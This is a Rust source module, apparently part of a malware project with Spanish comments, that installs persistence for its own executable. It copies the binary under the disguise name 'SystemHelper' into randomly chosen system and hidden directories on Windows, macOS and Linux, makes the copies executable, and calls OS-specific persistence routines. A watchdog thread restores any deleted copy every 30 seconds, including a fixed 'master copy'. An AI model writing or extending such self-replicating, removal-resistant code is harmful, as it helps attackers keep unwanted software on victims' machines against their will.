// persistence/mod.rs
#[cfg(target_os = "windows")]
mod windows;

#[cfg(target_os = "macos")]
mod macos;

#[cfg(target_os = "linux")]
mod linux;

use std::env;
use std::path::PathBuf;

// ============================================================
// CONFIGURACIÓN
// ============================================================

/// Número total de copias (incluyendo la principal)
const TOTAL_COPIES: usize = 3;

/// Obtiene las rutas posibles para las copias (dinámicas según el usuario)
fn get_rutas_posibles() -> Vec<String> {
    let home = env::var("HOME").unwrap_or_else(|_| "/Users/Shared".to_string());
    let user = env::var("USER").unwrap_or_else(|_| "user".to_string());

    let mut rutas = Vec::new();

    // ========== WINDOWS ==========
    rutas.push("C:\\Windows\\System32\\drivers\\SystemHelper.exe".to_string());
    rutas.push("C:\\Windows\\System32\\catroot2\\SystemHelper.exe".to_string());
    rutas.push("C:\\Windows\\Installer\\SystemHelper.exe".to_string());
    rutas.push("C:\\Windows\\Prefetch\\SystemHelper.exe".to_string());
    rutas.push("C:\\ProgramData\\Microsoft\\Windows\\Caches\\SystemHelper.exe".to_string());
    rutas.push("C:\\Users\\Public\\Documents\\SystemHelper.exe".to_string());

    // ========== macOS (rutas de usuario - SIN SUDO) ==========
    rutas.push(format!("{}/Library/Application Support/SystemHelper", home));
    rutas.push(format!("{}/Library/Preferences/SystemHelper", home));
    rutas.push(format!("{}/Library/Caches/SystemHelper", home));
    rutas.push(format!("{}/.local/share/SystemHelper", home));
    rutas.push(format!("{}/.config/SystemHelper", home));
    rutas.push(format!("{}/.cache/SystemHelper", home));
    rutas.push(format!("{}/.system/SystemHelper", home));
    rutas.push("/Users/Shared/SystemHelper".to_string());
    rutas.push("/tmp/SystemHelper".to_string());
    rutas.push("/private/tmp/SystemHelper".to_string());

    // ========== Linux (rutas de usuario - SIN SUDO) ==========
    rutas.push(format!("/tmp/system-helper-{}", user));
    rutas.push(format!("{}/.local/share/system-helper", home));
    rutas.push(format!("{}/.config/system-helper", home));
    rutas.push(format!("{}/.cache/system-helper", home));
    rutas.push(format!("{}/.system/system-helper", home));

    rutas
}

// ============================================================

pub fn install() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔧 Instalando persistencia... (entró a install())");

    // 1. Copiar a las 3 ubicaciones
    println!("📌 Llamando a create_copies()...");
    let copias = create_copies()?;
    println!("📌 create_copies() devolvió {} copias", copias.len());

    // 2. Instalar persistencia según SO
    #[cfg(target_os = "windows")]
    {
        println!("📌 Llamando a windows::install_persistence()...");
        windows::install_persistence(&copias)?;
        println!("📌 windows::install_persistence() completado");
    }

    #[cfg(target_os = "macos")]
    {
        println!("📌 Llamando a macos::install_persistence()...");
        macos::install_persistence(&copias)?;
        println!("📌 macos::install_persistence() completado");
    }

    #[cfg(target_os = "linux")]
    {
        println!("📌 Llamando a linux::install_persistence()...");
        linux::install_persistence(&copias)?;
        println!("📌 linux::install_persistence() completado");
    }

    // 3. Iniciar watchdog (verifica y restaura copias)
    println!("📌 Iniciando watchdog...");
    start_watchdog();
    println!("📌 Watchdog iniciado");

    println!("✅ Persistencia instalada correctamente");
    Ok(())
}

/// Crea 3 copias en ubicaciones aleatorias
fn create_copies() -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
    use rand::seq::SliceRandom;
    use rand::thread_rng;
    use std::fs;

    let exe_path = std::env::current_exe()?;
    let exe_data = fs::read(&exe_path)?;

    let mut rng = thread_rng();
    let mut copias = Vec::new();

    // Obtener rutas posibles y seleccionar 3 aleatorias
    let mut rutas_seleccionadas: Vec<String> = get_rutas_posibles();
    rutas_seleccionadas.shuffle(&mut rng);
    rutas_seleccionadas.truncate(TOTAL_COPIES);

    for ruta in rutas_seleccionadas {
        let path = PathBuf::from(&ruta);

        // Crear directorio si no existe
        if let Some(parent) = path.parent() {
            let _ = fs::create_dir_all(parent);
        }

        // Copiar el ejecutable
        match fs::write(&path, &exe_data) {
            Ok(_) => {
                // En macOS/Linux, hacer ejecutable
                #[cfg(any(target_os = "macos", target_os = "linux"))]
                {
                    use std::os::unix::fs::PermissionsExt;
                    if let Ok(mut perms) = fs::metadata(&path).map(|m| m.permissions()) {
                        perms.set_mode(0o755);
                        let _ = fs::set_permissions(&path, perms);
                    }
                }
                println!("📁 Copia creada en: {}", path.display());
                copias.push(path);
            }
            Err(e) => {
                println!("⚠️ No se pudo crear copia en {}: {}", path.display(), e);
            }
        }
    }

    if copias.is_empty() {
        println!("⚠️ No se pudo crear ninguna copia. La persistencia será limitada.");
    }

    Ok(copias)
}

/// Inicia un watchdog que verifica y restaura las copias
// persistence/mod.rs - Watchdog mejorado

/// Inicia un watchdog que verifica y restaura las copias
fn start_watchdog() {
    use std::thread;
    use std::time::Duration;

    thread::spawn(|| {
        // Esperar 10 segundos antes de empezar (para que todo se inicialice)
        thread::sleep(Duration::from_secs(10));

        let interval = Duration::from_secs(30); // Revisar cada 30 segundos

        loop {
            thread::sleep(interval);
            println!("🔍 Watchdog: verificando copias...");

            match ensure_copies() {
                Ok(_) => println!("✅ Watchdog: verificación completada"),
                Err(e) => println!("⚠️ Watchdog: error en verificación: {}", e),
            }
        }
    });
}

/// Verifica que todas las copias existen. Si falta alguna, la restaura.
// persistence/mod.rs - ensure_copies() con más logs

/// Verifica que todas las copias existen. Si falta alguna, la restaura.
// persistence/mod.rs - Watchdog que verifica la copia maestra

/// Verifica que todas las copias existen. Si falta alguna, la restaura.
fn ensure_copies() -> Result<(), Box<dyn std::error::Error>> {
    use rand::seq::SliceRandom;
    use rand::thread_rng;
    use std::env;
    use std::fs;

    let exe_path = std::env::current_exe()?;
    let exe_data = fs::read(&exe_path)?;

    let rutas = get_rutas_posibles();
    let home = env::var("HOME")?;
    let master_path = format!("{}/.config/SystemHelper", home);

    // Buscar cuántas copias existen (incluyendo la maestra)
    let mut copias_existentes: Vec<PathBuf> = Vec::new();

    for ruta_str in &rutas {
        let path = PathBuf::from(ruta_str);
        if path.exists() {
            copias_existentes.push(path);
        }
    }

    // Verificar que la copia maestra existe
    let master_path_buf = PathBuf::from(&master_path);
    if !master_path_buf.exists() {
        println!("🔴 ¡La copia maestra no existe! Restaurando...");
        fs::write(&master_path_buf, &exe_data)?;
        #[cfg(any(target_os = "macos", target_os = "linux"))]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(&master_path_buf)?.permissions();
            perms.set_mode(0o755);
            fs::set_permissions(&master_path_buf, perms)?;
        }
        println!(
            "♻️ Copia maestra restaurada en: {}",
            master_path_buf.display()
        );
    }

    let copias_faltantes = TOTAL_COPIES.saturating_sub(copias_existentes.len());

    if copias_faltantes == 0 {
        return Ok(());
    }

    println!(
        "🔄 Restaurando {} copia(s) faltante(s)...",
        copias_faltantes
    );

    // Elegir rutas disponibles
    let mut rutas_disponibles: Vec<&String> = rutas
        .iter()
        .filter(|r| !PathBuf::from(r).exists())
        .collect();

    let mut rng = thread_rng();
    rutas_disponibles.shuffle(&mut rng);

    let mut creadas = 0;
    for ruta in rutas_disponibles {
        if creadas >= copias_faltantes {
            break;
        }

        let path = PathBuf::from(ruta);
        if let Some(parent) = path.parent() {
            let _ = fs::create_dir_all(parent);
        }

        match fs::write(&path, &exe_data) {
            Ok(_) => {
                #[cfg(any(target_os = "macos", target_os = "linux"))]
                {
                    use std::os::unix::fs::PermissionsExt;
                    if let Ok(mut perms) = fs::metadata(&path).map(|m| m.permissions()) {
                        perms.set_mode(0o755);
                        let _ = fs::set_permissions(&path, perms);
                    }
                }
                println!("♻️ Copia restaurada en: {}", path.display());
                creadas += 1;
            }
            Err(e) => {
                println!("⚠️ No se pudo restaurar en {}: {}", path.display(), e);
            }
        }
    }

    Ok(())
}
